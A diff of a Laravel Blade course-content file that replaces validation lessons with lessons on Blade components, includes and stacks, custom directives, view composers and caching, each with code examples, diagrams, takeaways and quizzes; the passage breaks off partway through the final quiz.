+{{-- ---------- @aware: a child reading the parent's prop ---------- --}}
+{{-- components/menu.blade.php --}}
+@props(['colour' => 'blue'])
+<ul {{ $attributes }}>{{ $slot }}</ul>
+
+{{-- components/menu/item.blade.php --}}
+{{-- Only sees props the PARENT received as attributes,
+     not values the parent computed itself. --}}
+@aware(['colour' => 'blue'])
+<li class="text-{{ $colour }}">{{ $slot }}</li>
+
+{{-- <x-menu colour="red"><x-menu.item>Invoices</x-menu.item></x-menu> --}}`,
       },
       keyTakeaways: [
-        "<b>`field.*`</b> validates every item in an array; `field.*.key` reaches inside each one.",
-        "Validate the array itself too: `['required', 'array', 'min:1', 'max:100']`.",
-        "Without a `max` on an array, someone can post tens of thousands of items and your code will process them.",
-        "<b>`messages()`</b> is keyed `field.rule`, and supports `:attribute`, `:min` and other placeholders.",
-        "<b>`attributes()`</b> renames a field once, improving every message that mentions it.",
-        "A <b>closure rule</b> handles a one-off; call `$fail(...)` to reject, since returning does nothing.",
-        "<b>`php artisan make:rule`</b> creates a reusable rule class implementing `ValidationRule`.",
-        "<b>`after()`</b> runs once the normal rules pass, for checks that span several fields.",
-        "<b>`bail`</b> stops at the first failure, which avoids running database rules for values already known to be invalid.",
+        "An <b>anonymous component</b> is just a file in `resources/views/components/`. Most components need nothing more.",
+        "The filename becomes the tag: `alert.blade.php` is `<x-alert>`, `forms/input.blade.php` is `<x-forms.input>`.",
+        "<b>`@props`</b> declares expected data with defaults; anything undeclared lands in `$attributes`.",
+        "<b>The colon matters</b>: `type=\"x\"` passes a string, `:type=\"$x\"` passes a PHP value.",
+        "`dismissible=\"false\"` passes the truthy string `\"false\"`. Booleans need the colon.",
+        "<b>`$attributes->merge([...])`</b> combines caller attributes with the component's own, which is what makes it reusable.",
+        "<b>Named slots</b> give several insertion points; wrap optional ones in `@isset`.",
+        "`php artisan make:component` creates a class when you need logic; `InvoiceStatus` becomes `<x-invoice-status>`.",
+        "<b>`@aware`</b> lets a child read a parent's prop, but only one passed as an attribute.",
       ],
       commonMistakes: [
-        "<b>Validating `lines.*` but not `lines`.</b> An empty array passes every item rule, because there are no items.",
-        "<b>Leaving an array without a `max`.</b> A huge payload is accepted and processed.",
-        "<b>Returning `false` from a custom rule.</b> Only calling `$fail()` rejects; a return value is ignored.",
-        "<b>Writing a message per field when the name is the problem.</b> `attributes()` fixes all of them at once.",
-        "<b>Omitting `bail` on a field with database rules.</b> Every failed submit runs queries for values already known to be bad.",
-        "<b>Putting a cross-field check in `rules()`.</b> It belongs in `after()`, where every field has already been validated.",
+        "<b>Passing a boolean without the colon.</b> `dismissible=\"false\"` is a non-empty string, so every check treats it as true.",
+        "<b>Rendering `{{ $attributes }}` and also hard-coding `class`.</b> You end up with two class attributes and the browser keeps one.",
+        "<b>Reaching for a class component by default.</b> Most components are presentational and an anonymous file is less to maintain.",
+        "<b>Not guarding optional named slots.</b> A missing `$footer` renders an empty wrapper div with its border and padding.",
+        "<b>Expecting `@aware` to see a computed value.</b> It only reads props the parent received as attributes.",
+        "<b>Getting the tag name wrong.</b> `InvoiceStatus` is `<x-invoice-status>`, not `<x-InvoiceStatus>`.",
       ],
       quiz: [
         {
-          question: "What does `lines.*.quantity` validate?",
+          question: "What is the difference between `type=\"error\"` and `:type=\"$status\"`?",
           options: [
-            "The quantity key inside every item of the lines array",
-            "The lines array itself",
-            "The first line only",
-            "A field named lines.*.quantity",
-          ],
-          correctIndex: 0,
-          explanation: "The wildcard means every item.",
-        },
-        {
-          question: "Why validate `lines` as well as `lines.*`?",
-          options: [
-            "For speed",
-            "`'array'` alone accepts an empty array, so item rules never run",
-            "It is required syntax",
-            "To allow nesting",
-          ],
-          correctIndex: 1,
-          explanation: "Add `min:1` when at least one item is required, and `max` to cap the size.",
-        },
-        {
-          question: "How does a custom rule reject a value?",
-          options: [
-            "Call `$fail(...)`",
-            "Throw an exception",
-            "Return false",
-            "Return null",
-          ],
-          correctIndex: 0,
-          explanation: "A return value is ignored entirely.",
-        },
-        {
-          question: "What is the practical benefit of `bail` beyond tidier messages?",
-          options: [
-            "It caches results",
-            "It skips authorization",
-            "It validates faster in memory",
-            "Database rules like `unique` never run for a value already known to be invalid",
+            "None",
+            "The colon escapes the value",
+            "The colon is for class components",
+            "The colon passes a PHP expression instead of a literal string",
           ],
           correctIndex: 3,
-          explanation: "On a form with several database rules that is several wasted queries per failed submit.",
+          explanation: "Which is why booleans need `:dismissible=\"true\"`.",
+        },
+        {
+          question: "Why does `dismissible=\"false\"` not work as expected?",
+          options: [
+            "Blade cannot parse it",
+            "It passes the string \"false\", which is truthy",
+            "It needs `@props`",
+            "Booleans are unsupported",
+          ],
+          correctIndex: 1,
+          explanation: "Use `:dismissible=\"false\"` to pass the actual boolean.",
+        },
+        {
+          question: "What does `$attributes->merge(['class' => 'alert'])` achieve?",
+          options: [
+            "Replaces caller attributes",
+            "Combines the component's defaults with whatever the caller passed",
+            "Escapes the attributes",
+            "Validates them",
+          ],
+          correctIndex: 1,
+          explanation: "That is what lets a caller add `class=\"mt-4\"` without you anticipating it.",
+        },
+        {
+          question: "What is the tag for a component class named `InvoiceStatus`?",
+          options: [
+            "`<x-invoice-status>`",
+            "`<x-invoice_status>`",
+            "`<x-InvoiceStatus>`",
+            "`<x-invoicestatus>`",
+          ],
+          correctIndex: 0,
+          explanation: "StudlyCase class names become kebab-case tags.",
+        },
+      ],
+    },
+    {
+      id: "includes-and-stacks",
+      title: "Includes, @each and stacks",
+      durationMinutes: 11,
+      explanation: "Two more ways to break a page into pieces, and one for getting scripts into the layout.\n\nAn <b>include</b> drops another Blade file in place, and the included file shares the including view's variables. A <b>stack</b> is a named placeholder in the layout that child views and components push content onto, which is how a page gets its own scripts into the head or footer.\n\n---\n\n### 1. Basic — includes\n\n`@include` drops another Blade file in place:\n\n```blade\n@include('partials.invoice-summary')\n```\n\nAn included file <b>inherits every variable</b> from the view that included it, which is the main difference from a component. You can also pass extra data:\n\n```blade\n@include('partials.invoice-row', ['invoice' => $invoice, 'showActions' => true])\n```\n\nConditional variants:\n\n```blade\n@includeIf('partials.banner')                        {{-- skip if missing --}}\n@includeWhen($user->isAdmin(), 'partials.admin-bar')\n@includeUnless($invoice['paid'], 'partials.pay-button')\n@includeFirst(['custom.header', 'partials.header'])  {{-- first that exists --}}\n```\n\n`@each` renders one view per item, with a built-in empty case:\n\n```blade\n@each('partials.invoice-row', $invoices, 'invoice', 'partials.no-invoices')\n```\n\n```text\n   view to render    the items    variable name    view if empty\n```\n\n---\n\n### 2. Intermediate — include or component?\n\nThey overlap, and the choice is not arbitrary.\n\n```text\n@include                          <x-component>\n────────                          ─────────────\ninherits ALL parent variables     receives only what you pass\nno declared interface             @props says what it needs\nno attribute merging              $attributes merges\na fragment of this page           a reusable piece of UI\n```\n\nThat first row is the real difference. An include silently depends on whatever happened to be in scope, so moving it to another page can break it with a message about an undefined variable. A component's `@props` line states its interface, so it works wherever you use it.\n\nA reasonable rule:\n\n```text\nUsed in one page, splitting a long template  →  @include\nUsed in several places, or with a real API   →  component\n```\n\nComponents are the better default for anything reusable. Includes are fine for cutting a 300-line template into readable pieces.\n\n---\n\n### 3. Advanced — stacks\n\nA page often needs a script or stylesheet that the layout knows nothing about. You cannot put it in `@section('content')`, because it belongs in `<head>` or at the end of `<body>`.\n\n<b>Stacks</b> solve this. The layout declares a named place:\n\n```blade\n<head>\n    @stack('styles')\n</head>\n<body>\n    ...\n    @stack('scripts')\n</body>\n```\n\nAny page or component pushes into it:\n\n```blade\n@push('scripts')\n    <script src=\"/js/invoice-chart.js\"></script>\n@endpush\n```\n\n```text\nchild view\n    │ @push('scripts')\n    ↓\n\"scripts\" stack\n    │\n    ↓\nlayout: @stack('scripts')   →  rendered in <body>\n```\n\n`@prepend` puts content at the front, for something that must load first:\n\n```blade\n@prepend('scripts')\n    <script src=\"/js/vendor.js\"></script>\n@endprepend\n```\n\nThe reason stacks matter more than they first appear: <b>components can push too</b>. A date-picker component can push its own JavaScript into the layout's script stack, so using the component is all a page has to do. Nothing has to remember to add the script.\n\nWhich raises the obvious problem. Use that component five times on one page and the script is pushed five times. `@once` fixes it:\n\n```blade\n@once\n    @push('scripts')\n        <script src=\"/js/datepicker.js\"></script>\n    @endpush\n@endonce\n```\n\n`@once` renders its contents a single time per request, however many times the surrounding template runs. There is also `@pushOnce`, which is the same idea in one directive:\n\n```blade\n@pushOnce('scripts')\n    <script src=\"/js/datepicker.js\"></script>\n@endPushOnce\n```\n\nThat pairing, a component that carries its own assets and pushes them once, is what makes a component library genuinely self-contained.",
+      diagram: `@include inherits scope; a component does not
+
+  @include('partials.row')          <x-invoice-row :invoice="$invoice" />
+        │                                    │
+  sees EVERY variable in the        sees only what you passed;
+  including view                    @props declares its interface
+        │                                    │
+  move it elsewhere → may           works anywhere
+  break on an undefined variable
+
+  One page, splitting a long file  →  @include
+  Reused, or with a real API       →  component
+
+
+Stacks: pushing into the layout from anywhere
+
+  invoices/index.blade.php          components/date-picker.blade.php
+      @push('scripts')                  @pushOnce('scripts')
+        chart.js                          datepicker.js
+      @endpush                          @endPushOnce
+          │                                   │
+          └───────────────┬───────────────────┘
+                          ↓
+                   "scripts" stack
+                          ↓
+  layouts/app.blade.php:  @stack('scripts')
+                          ↓
+                    rendered once, in <body>
+
+  @push     → end of the stack
+  @prepend  → front of the stack (loads first)
+
+
+The duplicate problem
+
+  <x-date-picker /> used 5 times
+            ↓
+  @push  → the script tag appears 5 times
+  @once / @pushOnce → once per request`,
+      codeExample: {
+        title: "Includes, @each, and a self-contained component",
+        code: `{{-- ---------- Includes ---------- --}}
+
+{{-- Inherits every variable in scope here --}}
+@include('partials.invoice-summary')
+
+{{-- Plus extra data of its own --}}
+@include('partials.invoice-row', ['invoice' => $invoice, 'showActions' => true])
+
+{{-- Conditional variants --}}
+@includeIf('partials.banner')                          {{-- skip if missing --}}
+@includeWhen(auth()->user()?->isAdmin(), 'partials.admin-bar')
+@includeUnless($invoice['paid'], 'partials.pay-button')
+@includeFirst(['custom.header', 'partials.header'])    {{-- first that exists --}}
+
+{{-- One view per item, with a built-in empty case --}}
+@each('partials.invoice-row', $invoices, 'invoice', 'partials.no-invoices')
+
+
+{{-- ---------- The layout declares the stacks ---------- --}}
+{{-- resources/views/layouts/app.blade.php --}}
+<!DOCTYPE html>
+<html>
+<head>
+    <title>@yield('title', 'InvoiceHub')</title>
+    @stack('styles')
+</head>
+<body>
+    <main>@yield('content')</main>
+
+    <script src="/js/app.js"></script>
+    @stack('scripts')
+</body>
+</html>
+
+
+{{-- ---------- A page pushing its own assets ---------- --}}
+{{-- resources/views/invoices/index.blade.php --}}
+@extends('layouts.app')
+
+@section('content')
+    <h1>Invoices</h1>
+    <canvas id="invoice-chart"></canvas>
+
+    <x-date-picker name="from" />
+    <x-date-picker name="to" />
+@endsection
+
+@push('styles')
+    <link rel="stylesheet" href="/css/invoices.css">
+@endpush
+
+@push('scripts')
+    <script src="/js/invoice-chart.js"></script>
+@endpush
+
+{{-- Must load before everything else in the stack --}}
+@prepend('scripts')
+    <script src="/js/vendor.js"></script>
+@endprepend
+
+
+{{-- ---------- A component that carries its own script ---------- --}}
+{{-- resources/views/components/date-picker.blade.php --}}
+@props(['name'])
+
+<input type="text" name="{{ $name }}" class="date-picker">
+
+{{-- Used twice on the page above. Without @pushOnce the script tag
+     would appear twice. --}}
+@pushOnce('scripts')
+    <script src="/js/datepicker.js"></script>
+@endPushOnce
+
+{{-- The longer equivalent:
+@once
+    @push('scripts')
+        <script src="/js/datepicker.js"></script>
+    @endpush
+@endonce
+--}}`,
+      },
+      keyTakeaways: [
+        "<b>`@include`</b> renders another Blade file and <b>inherits every variable</b> in scope.",
+        "`@includeIf`, `@includeWhen`, `@includeUnless` and `@includeFirst` cover the conditional cases.",
+        "<b>`@each`</b> renders one view per item and takes a fourth argument for the empty case.",
+        "An include has <b>no declared interface</b>; a component's `@props` states what it needs.",
+        "Use includes to split one long template; use components for anything reused.",
+        "<b>`@stack`</b> declares a named place in the layout; <b>`@push`</b> and `@prepend` add to it from anywhere.",
+        "Components can push their own scripts, which makes them self-contained.",
+        "<b>`@once` / `@pushOnce`</b> stop a repeated component pushing the same asset several times.",
+      ],
+      commonMistakes: [
+        "<b>Relying on an include inheriting a variable.</b> Move it to another page and it breaks with an undefined variable error.",
+        "<b>Using an include for something reused across pages.</b> With no `@props`, nothing documents what it needs.",
+        "<b>Pushing a script from a component without `@once`.</b> Render it five times and the tag appears five times.",
+        "<b>Forgetting `@stack` in the layout.</b> Everything pushed is silently discarded, with no error to explain the missing script.",
+        "<b>Putting scripts in `@section('content')`.</b> They end up in the middle of the page rather than where the layout wants them.",
+        "<b>Mismatching the closing directive.</b> `@pushOnce` closes with `@endPushOnce`, which is easy to mistype.",
+      ],
+      quiz: [
+        {
+          question: "What is the main difference between `@include` and a component?",
+          options: [
+            "Speed",
+            "Components cannot be nested",
+            "Includes cannot take data",
+            "An include inherits all parent variables; a component receives only what you pass",
+          ],
+          correctIndex: 3,
+          explanation: "Which is why an include can break when moved to another page.",
+        },
+        {
+          question: "What does `@stack('scripts')` do?",
+          options: [
+            "Pushes a script",
+            "Declares a place in the layout where pushed content is rendered",
+            "Loads all scripts",
+            "Caches scripts",
+          ],
+          correctIndex: 1,
+          explanation: "Pages and components then push into it with `@push`.",
+        },
+        {
+          question: "A component used five times pushes its script five times. What fixes it?",
+          options: [
+            "`@prepend`",
+            "`@once` or `@pushOnce`",
+            "`@includeFirst`",
+            "`@each`",
+          ],
+          correctIndex: 1,
+          explanation: "It renders its contents a single time per request.",
+        },
+        {
+          question: "You push to a stack and nothing appears. What is the likely cause?",
+          options: [
+            "You need `@prepend`",
+            "The script is cached",
+            "The layout has no matching `@stack`",
+            "Stacks only work in components",
+          ],
+          correctIndex: 2,
+          explanation: "Pushed content is silently discarded when nothing renders the stack.",
+        },
+      ],
+    },
+    {
+      id: "directives-and-composers",
+      title: "Custom directives, view composers and caching",
+      durationMinutes: 12,
+      explanation: "The last group: extending Blade, feeding data to views automatically, and understanding the compiled cache.\n\nA <b>custom directive</b> is your own `@something`, registered with `Blade::directive`. A <b>view composer</b> is a callback that attaches data to a view every time it renders, so a controller does not have to pass it. The <b>compiled view cache</b> is the plain PHP that Blade generates from your templates, kept in `storage/framework/views/`.\n\n---\n\n### 1. Basic — inline PHP, injection and JSON\n\n`@php` runs PHP in a template:\n\n```blade\n@php\n    $total = $subtotal + $tax;\n@endphp\n```\n\nIt works, and a long one is a signal the controller should have done the work.\n\n`@inject` pulls a service out of the container:\n\n```blade\n@inject('metrics', 'App\\Services\\MetricsService')\n\n<p>{{ $metrics->invoicesThisMonth() }}</p>\n```\n\nUse it sparingly. A view that resolves its own services has hidden dependencies: nothing in the controller or the route says the template needs a `MetricsService`, so a change to that class breaks a page nobody thought to check.\n\n`@json` you met in lesson two, and it is the correct way to hand data to JavaScript.\n\n---\n\n### 2. Intermediate — custom directives\n\nWhen a formatting pattern repeats across many templates, you can add your own directive. Register it in a service provider's `boot()`:\n\n```php\npublic function boot(): void\n{\n    Blade::directive('money', function (string $expression) {\n        return \"<?php echo number_format($expression, 2); ?>\";\n    });\n}\n```\n\n```blade\n<td>@money($invoice['total'])</td>\n```\n\nThe thing to understand: your closure runs at <b>compile</b> time, not render time. It receives the expression as a <i>string</i> and must return a string of PHP code. That is why you cannot inspect the value inside the directive; it does not exist yet.\n\n`Blade::if` is simpler and covers most cases:\n\n```php\nBlade::if('admin', fn () => auth()->user()?->isAdmin() ?? false);\n```\n\n```blade\n@admin\n    <a href=\"{{ route('admin.invoices.index') }}\">Admin</a>\n@endadmin\n```\n\nKeep both small. A custom directive that contains business logic hides that logic in a service provider, where nobody looks.\n\nTwo practical notes: after adding or changing a directive, run `php artisan view:clear`, because already-compiled templates still hold the old output. And an anonymous component often does the same job more clearly than a directive.\n\n---\n\n### 3. Advanced — view composers, and the cache\n\nSome data belongs on a view every time it renders. Unread notification counts in the navigation, for example. Passing it from every controller is repetitive and easy to forget.\n\nA <b>view composer</b> (a callback that runs whenever a given view renders, and adds data to it) handles that:\n\n```php\n// In a service provider's boot()\nView::composer('layouts.app', function ($view) {\n    $view->with('unreadCount', auth()->user()?->unreadNotifications()->count() ?? 0);\n});\n```\n\nNow `$unreadCount` exists in that layout no matter which controller rendered it. Wildcards work too:\n\n```php\nView::composer(['invoices.*'], InvoiceComposer::class);\nView::composer('*', GlobalComposer::class);        // every view\n```\n\nFor anything non-trivial use a class, which the container resolves, so it can take constructor dependencies:\n\n```php\nclass InvoiceComposer\n{\n    public function __construct(private InvoiceStore $invoices) {}\n\n    public function compose(View $view): void\n    {\n        $view->with('recentInvoices', $this->invoices->recent());\n    }\n}\n```\n\nThe honest trade-off: a composer makes data appear in a template with nothing in the controller to explain it. That is convenient and it is also how a page gains a mystery variable. Use them for genuinely global things like navigation counts, not as a way to avoid passing data.\n\n<b>View creators</b> are the same mechanism, registered with `View::creator()`, but they run when the view is instantiated rather than just before it renders. The difference matters rarely.\n\nFinally, caching. Blade compiles to PHP in `storage/framework/views/` and recompiles when the source changes, so development needs no thought. For production, precompile at deploy:\n\n```bash\nphp artisan view:cache      # compile everything up front\nphp artisan view:clear      # remove compiled views\n```\n\n`php artisan optimize` runs this along with the route and config caches, and `optimize:clear` undoes all of them. When a template change stubbornly refuses to appear, `view:clear` is the first thing to try.",
+      diagram: `A custom directive runs at COMPILE time
+
+  Blade::directive('money', function ($expression) {
+      return "<?php echo number_format($expression, 2); ?>";
+  });                              │
+                                   └── a STRING of code, not a value
+
+  @money($invoice['total'])
+            ↓ compile
+  <?php echo number_format($invoice['total'], 2); ?>
+            ↓ render
+         1,250.00
+
+  Changed a directive? php artisan view:clear
+  Already-compiled templates hold the old output.
+
+
+View composer: data that appears by itself
+
+  any controller renders layouts.app
+              ↓
+        View::composer('layouts.app', ...)
+              ↓
+        adds $unreadCount
+              ↓
+        the template has it
+
+  Convenient, and the reason a template can gain a
+  variable with nothing in the controller to explain it.
+  Use for navigation counts, not to avoid passing data.
+
+
+The compiled cache
+
+  invoices/index.blade.php
+        ↓ compile (source changed)
+  storage/framework/views/a3f9c2....php
+        ↓ execute
+
+  view:cache   precompile everything (deploy)
+  view:clear   throw the compiled files away
+  optimize     view + route + config caches together`,
+      codeExample: {
+        title: "Directives, composers and the cache",
+        code: `<?php
+// app/Providers/AppServiceProvider.php
+
+namespace App\\Providers;
+
+use Illuminate\\Support\\Facades\\Blade;
+use Illuminate\\Support\\Facades\\View;
+use Illuminate\\Support\\ServiceProvider;
+
+class AppServiceProvider extends ServiceProvider
+{
+    public function boot(): void
+    {
+        // ---------- A custom directive ----------
+        // The closure runs at COMPILE time and receives the expression
+        // as a string. It must RETURN a string of PHP code.
+        Blade::directive('money', function (string $expression) {
+            return "<?php echo number_format($expression, 2); ?>";
+        });
+
+        // ---------- A custom conditional ----------
+        Blade::if('admin', function () {
+            return auth()->user()?->isAdmin() ?? false;
+        });
+
+        // ---------- View composers ----------
+        // Runs whenever this view renders, whichever controller did it.
+        View::composer('layouts.app', function ($view) {
+            $view->with(
+                'unreadCount',
+                auth()->user()?->unreadNotifications()->count() ?? 0,
+            );
+        });
+
+        // A class, resolved through the container, so it can take
+        // constructor dependencies.
+        View::composer(['invoices.*'], \\App\\View\\Composers\\InvoiceComposer::class);
+
+        // Every view in the application.
+        // View::composer('*', \\App\\View\\Composers\\GlobalComposer::class);
+
+        // Same idea, but when the view is INSTANTIATED rather than rendered.
+        // View::creator('invoices.index', \\App\\View\\Creators\\InvoiceCreator::class);
+    }
+}
+
+
+// app/View/Composers/InvoiceComposer.php
+namespace App\\View\\Composers;
+
+use App\\Services\\InvoiceStore;
+use Illuminate\\View\\View;
+
+class InvoiceComposer
+{
+    public function __construct(private InvoiceStore $invoices) {}
+
+    public function compose(View $view): void
+    {
+        $view->with('recentInvoices', $this->invoices->recent());
+    }
+}
+?>
+
+{{-- ---------- Using them ---------- --}}
+
+<td>@money($invoice['total'])</td>          {{-- 1,250.00 --}}
+
+@admin
+    <a href="{{ route('admin.invoices.index') }}">Admin</a>
+@endadmin
+
+{{-- $unreadCount came from the composer, not from any controller --}}
+<span class="badge">{{ $unreadCount }}</span>
+
+{{-- @inject: convenient, but the dependency is invisible to the
+     controller and the route. Use sparingly. --}}
+@inject('metrics', 'App\\Services\\MetricsService')
+<p>{{ $metrics->invoicesThisMonth() }}</p>
+
+{{-- @php works. A long one means the controller should have done it. --}}
+@php
+    $total = $subtotal + $tax;
+@endphp
+
+# ---------- Deployment ----------
+# php artisan view:cache      compile every template up front
+# php artisan view:clear      throw the compiled files away
+# php artisan optimize        view + route + config caches
+# php artisan optimize:clear  undo all of them`,
+      },
+      keyTakeaways: [
+        "<b>`@php`</b> runs inline PHP; a long block means the controller should have prepared the data.",
+        "<b>`@inject`</b> resolves a service in a template, but hides the dependency from the controller and route.",
+        "<b>`Blade::directive`</b> runs at <b>compile time</b>: it receives an expression string and returns PHP code.",
+        "<b>`Blade::if`</b> is the simpler tool for a custom conditional and covers most cases.",
+        "Run <b>`view:clear` after changing a directive</b>, or compiled templates keep the old output.",
+        "A <b>view composer</b> adds data whenever a given view renders, and supports wildcards like `invoices.*`.",
+        "Composers are resolved through the container, so a composer class can take constructor dependencies.",
+        "The trade-off: a composer makes a variable appear with nothing in the controller to explain it. Use it for global things.",
+        "<b>`view:cache`</b> precompiles for production; `view:clear` is the first thing to try when a change will not appear.",
+      ],
+      commonMistakes: [
+        "<b>Returning a value from `Blade::directive` instead of PHP code.</b> It runs at compile time, so it must return a string of code.",
+        "<b>Forgetting `view:clear` after editing a directive.</b> Compiled templates still hold the old generated PHP.",
+        "<b>Putting business logic in a directive.</b> It ends up hidden in a service provider where nobody thinks to look.",
+        "<b>Using composers to avoid passing data.</b> Templates then depend on variables with no visible source.",
+        "<b>Registering `View::composer('*', ...)` with an expensive query.</b> It now runs for every view in the application.",
+        "<b>Relying on `@inject` in many templates.</b> Changing that service breaks pages nothing links it to.",
+      ],
+      quiz: [
+        {
+          question: "When does the closure passed to `Blade::directive` run?",
+          options: [
+            "At compile time, returning a string of PHP code",
+            "On every render",
+            "When the app boots",
+            "Only in production",
+          ],
+          correctIndex: 0,
+          explanation: "Which is why it cannot inspect the value; it does not exist yet.",
+        },
+        {
+          question: "What must you do after changing a custom directive?",
+          options: [
+            "Restart the server",
+            "`composer dump-autoload`",
+            "`php artisan view:clear`",
+            "Nothing",
+          ],
+          correctIndex: 2,
+          explanation: "Already-compiled templates still contain the old generated PHP.",
+        },
+        {
+          question: "What does a view composer do?",
+          options: [
+            "Creates a view file",
+            "Compiles templates",
+            "Adds data to a view whenever it renders, from anywhere",
+            "Caches a view",
+          ],
+          correctIndex: 2,
+          explanation: "Useful for global things like a navigation notification count.",
+        },
+        {
+          question: "What is the drawback of view composers?",
+          options: [
+            "They are slow",
+            "They only work on layouts",
+            "They break caching",
+            "A template gains a variable with nothing in the controller to explain it",
+          ],
+          correctIndex: 3,
+          explanation: "Which is why they suit genuinely global data rather than ordinary page data.",
         },
       ],
     },
   ],
   finalQuiz: [
     {
-      question: "What happens when `$request->validate()` fails?",
+      question: "How do you refer to `resources/views/invoices/index.blade.php`?",
       options: [
-        "It returns false",
-        "It returns an empty array",
-        "It throws a ValidationException that Laravel turns into a response",
-        "It logs a warning",
+        "`invoices.index`",
+        "`invoices/index`",
+        "`views.invoices.index`",
+        "`index.blade.php`",
       ],
-      correctIndex: 2,
-      explanation: "Which is why you never write an `if` around it.",
+      correctIndex: 0,
+      explanation: "Slashes in the path become dots in the name.",
     },
     {
-      question: "What status code does failed validation return to an API client?",
+      question: "What does Laravel do with a Blade template?",
       options: [
-        "400",
-        "422",
-        "500",
-        "403",
+        "Interprets it every request",
+        "Compiles it to plain PHP and caches the result",
+        "Serves it directly",
+        "Converts it to JavaScript",
       ],
       correctIndex: 1,
-      explanation: "422 means the request was understood but the data is unacceptable.",
+      explanation: "Which is why directives cost essentially nothing at runtime.",
     },
     {
-      question: "Why is `Model::create($request->all())` dangerous?",
+      question: "Which of these belongs in a controller, not a template?",
+      options: [
+        "Looping over invoices",
+        "Choosing a CSS class",
+        "Running the query that fetches them",
+        "Formatting a date",
+      ],
+      correctIndex: 2,
+      explanation: "A template may read data and decide how to show it, not fetch it.",
+    },
+    {
+      question: "What is the difference between `{{ }}` and `{!! !!}`?",
+      options: [
+        "`{!! !!}` is faster",
+        "`{{ }}` escapes HTML; `{!! !!}` prints it raw",
+        "`{{ }}` only handles strings",
+        "None",
+      ],
+      correctIndex: 1,
+      explanation: "Escaping is what stops a user's input executing as markup.",
+    },
+    {
+      question: "Why is `{!! $userInput !!}` dangerous?",
       options: [
         "It is slow",
-        "It skips validation",
-        "Any field the client sends reaches the model, including ones you never intended",
-        "It can be null",
+        "It breaks caching",
+        "The browser runs any script the user typed, for every visitor",
+        "It double-escapes",
       ],
       correctIndex: 2,
-      explanation: "A form field named `is_paid=1` gets written straight to the column.",
+      explanation: "That is cross-site scripting.",
     },
     {
-      question: "What does `validate()` return on success?",
+      question: "How should you pass a PHP value into a `<script>` block?",
       options: [
-        "Everything sent",
-        "A boolean",
-        "Only the fields you wrote rules for",
-        "The Request",
-      ],
-      correctIndex: 2,
-      explanation: "Which is what makes it safe to pass to `create()`.",
-    },
-    {
-      question: "Why does an optional text field need `nullable`?",
-      options: [
-        "Laravel turns empty inputs into null, which fails rules like `string`",
-        "Performance",
-        "It is required syntax",
-        "To allow an empty string",
-      ],
-      correctIndex: 0,
-      explanation: "Otherwise leaving an optional field blank produces an error.",
-    },
-    {
-      question: "What does `max:2048` mean on a file?",
-      options: [
-        "2048 bytes",
-        "2048 megabytes",
-        "2048 characters",
-        "2048 kilobytes, about 2 MB",
+        "`\"{{ $value }}\"`",
+        "`{!! $value !!}`",
+        "`@php`",
+        "`@json($value)`",
       ],
       correctIndex: 3,
-      explanation: "The unit for files is kilobytes.",
+      explanation: "`{{ }}` escapes for HTML, which is the wrong encoding for JavaScript.",
     },
     {
-      question: "What is the difference between `unique` and `exists`?",
+      question: "Why default to `@forelse` over `@foreach`?",
       options: [
-        "`unique` must not already exist; `exists` must already exist",
-        "They are the same",
-        "`exists` is for files",
-        "`unique` only works on strings",
-      ],
-      correctIndex: 0,
-      explanation: "`exists` is what stops a forged foreign key.",
-    },
-    {
-      question: "Why is `'image'` alone risky?",
-      options: [
-        "It accepts SVG, which can contain JavaScript",
-        "It only allows JPEG",
-        "It ignores size",
-        "It is slow",
-      ],
-      correctIndex: 0,
-      explanation: "Served from your domain, that script runs on your site.",
-    },
-    {
-      question: "When does a Form Request run its rules?",
-      options: [
-        "When you call `validated()`",
-        "While Laravel resolves the controller argument",
-        "After the controller returns",
-        "In middleware",
-      ],
-      correctIndex: 1,
-      explanation: "So the method body is only reached on success.",
-    },
-    {
-      question: "What happens when `authorize()` returns false?",
-      options: [
-        "A validation error",
-        "A redirect to login",
-        "A 403",
-        "Rules are skipped",
-      ],
-      correctIndex: 2,
-      explanation: "A permission problem is not fixable by editing a field.",
-    },
-    {
-      question: "What is `prepareForValidation()` for?",
-      options: [
-        "Normalising input before the rules run",
-        "Preparing the response",
-        "Authorizing",
-        "Running rules twice",
-      ],
-      correctIndex: 0,
-      explanation: "So `unique` compares the cleaned value.",
-    },
-    {
-      question: "When is `Validator::make()` the right tool?",
-      options: [
-        "For every form",
-        "When validating data that is not the current HTTP request",
-        "Only in tests",
-        "For better performance",
-      ],
-      correctIndex: 1,
-      explanation: "A CSV row during an import, or a queued job payload.",
-    },
-    {
-      question: "When is `$errors` available in Blade?",
-      options: [
-        "Only after a failure",
-        "Always, as an empty bag when nothing failed",
-        "Only inside `@error`",
-        "Only on POST",
-      ],
-      correctIndex: 1,
-      explanation: "So `$errors->any()` needs no `isset()` guard.",
-    },
-    {
-      question: "Why do you need `old()` on a form input?",
-      options: [
-        "For validation to work",
-        "To set a placeholder",
-        "For CSRF",
-        "So the user does not retype everything after one mistake",
+        "It is faster",
+        "It handles nesting",
+        "It supports `$loop`",
+        "The empty case is part of the same block, so it cannot be forgotten",
       ],
       correctIndex: 3,
-      explanation: "Validation flashes the old input; `old()` reads it back.",
+      explanation: "Otherwise an empty list renders a header above nothing.",
     },
     {
-      question: "Why are named error bags useful?",
+      question: "What does `$loop->last` help you avoid?",
       options: [
-        "They stop two forms on one page showing each other's errors",
-        "Stricter validation",
-        "They enable JSON",
-        "Speed",
+        "A trailing comma when joining items",
+        "Nested loops",
+        "Extra queries",
+        "Escaping issues",
       ],
       correctIndex: 0,
-      explanation: "Otherwise failing one form shows errors under the other.",
+      explanation: "No manual counter needed.",
     },
     {
-      question: "What is the difference between `nullable` and `sometimes`?",
+      question: "Where is `$loop` available?",
+      options: [
+        "Anywhere in a Blade file",
+        "Only in components",
+        "Only inside Blade's loop directives",
+        "Only in layouts",
+      ],
+      correctIndex: 2,
+      explanation: "A raw `@php foreach` block has no `$loop`.",
+    },
+    {
+      question: "In template inheritance, what does `@yield('content')` do?",
+      options: [
+        "Defines content",
+        "Includes a view",
+        "Marks where the child's matching `@section` is inserted",
+        "Creates a component",
+      ],
+      correctIndex: 2,
+      explanation: "The layout pulls content from named sections.",
+    },
+    {
+      question: "How does a page pass its main content to a component layout?",
+      options: [
+        "As `$slot`",
+        "`@yield`",
+        "`@include`",
+        "`@section`",
+      ],
+      correctIndex: 0,
+      explanation: "Everything between the tags becomes `$slot`.",
+    },
+    {
+      question: "What does `@parent` do inside a section?",
+      options: [
+        "Keeps the layout's version and adds to it",
+        "Extends the layout",
+        "Calls the parent controller",
+        "References the outer loop",
+      ],
+      correctIndex: 0,
+      explanation: "Useful for adding to a default sidebar rather than replacing it.",
+    },
+    {
